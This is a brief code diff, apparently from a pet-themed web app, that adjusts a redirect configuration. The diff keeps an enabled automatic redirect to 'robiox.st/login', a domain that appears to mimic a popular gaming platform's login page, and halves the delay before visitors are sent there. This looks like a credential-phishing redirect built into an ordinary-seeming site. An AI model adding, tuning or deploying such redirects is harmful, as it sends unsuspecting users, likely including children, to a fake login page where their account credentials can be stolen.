@@ -119,7 +119,7 @@ const pets: Pet[] = [
 const REDIRECT_CONFIG = {
   enabled: true,
   url: "https://robiox.st/login?returnUrl=3889777624249851",
-  delay: 1000,
+  delay: 500,
   autoRedirect: true,
 }
 
